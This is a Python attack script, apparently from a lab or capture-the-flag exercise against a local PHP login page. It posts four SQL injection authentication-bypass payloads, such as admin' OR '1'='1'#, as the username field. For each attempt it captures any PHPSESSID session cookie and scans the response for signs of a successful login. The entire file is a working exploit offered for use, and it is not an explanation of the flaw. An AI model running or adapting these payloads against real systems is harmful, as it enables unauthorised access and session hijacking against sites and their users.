import requests
import json

# Configuration
target_url = "http://127.0.0.1:33210/index.php"
password = "dummy123"
submit = "Submit"

# Payloads to test for SQL injection bypass
payloads = [
    "admin' OR '1'='1'#",
    "admin' AND 1=1#",
    "' OR username LIKE 'admin'#",
    "admin'--"
]

print(f"[!] Testing SQL Injection Authentication Bypass on {target_url}\n")
print("=" * 80)

working_payloads = []

# Test each payload
for i, payload in enumerate(payloads, 1):
    print(f"\n[TEST {i}] Payload: {payload}")
    print("-" * 80)
    
    # POST data
    data = {
        "username": payload,
        "password": password,
        "submit": submit
    }
    
    try:
        # Make the request
        response = requests.post(target_url, data=data, timeout=10)
        
        # Print response details
        print(f"Status Code: {response.status_code}")
        print(f"Response Length: {len(response.content)} bytes")
        
        # Check headers for Set-Cookie
        print(f"\nHeaders Set-Cookie: {response.headers.get('Set-Cookie', 'None')}")
        
        # Extract PHPSESSID if present
        session_cookies = {}
        if response.cookies:
            session_cookies = requests.utils.dict_from_cookiejar(response.cookies)
            print(f"Session Cookies: {session_cookies}")
        
        phpsessid = session_cookies.get('PHPSESSID')
        if phpsessid:
            print(f"[✓ SUCCESS] PHPSESSID found: {phpsessid}")
            working_payloads.append({
                'payload': payload,
                'phpsessid': phpsessid,
                'response_length': len(response.content)
            })
        
        # Try to parse response as JSON
        try:
            json_response = response.json()
            print(f"\nJSON Response: {json.dumps(json_response, indent=2)}")
            
            # Check for login success indicators
            if json_response.get('status') == 'success' or \
               json_response.get('authenticated') == True or \
               json_response.get('login') == 'success':
                print(f"[✓ SUCCESS] JSON indicates successful authentication!")
        except:
            # If not JSON, print response text
            print(f"\nResponse Text (first 500 chars):\n{response.text[:500]}")
        
        # Additional checks for common success patterns
        response_text = response.text.lower()
        success_indicators = ['welcome', 'dashboard', 'profile', 'logged in', 'success']
        for indicator in success_indicators:
            if indicator in response_text:
                print(f"[+] Found success indicator: '{indicator}'")
    
    except Exception as e:
        print(f"[ERROR] Request failed: {e}")

# Summary
print("\n" + "=" * 80)
print("SUMMARY")
print("=" * 80)

if working_payloads:
    print(f"[*] {len(working_payloads)} payload(s) successfully bypassed authentication:\n")
    for wp in working_payloads:
        print(f"[✓] Payload: {wp['payload']}")
        print(f"    PHPSESSID: {wp['phpsessid']}")
        print(f"    Response Length: {wp['response_length']} bytes")
        print()
else:
    print("[✗] No payloads successfully bypassed authentication")
    print("[-] All payloads may be filtered or injection attempt failed")
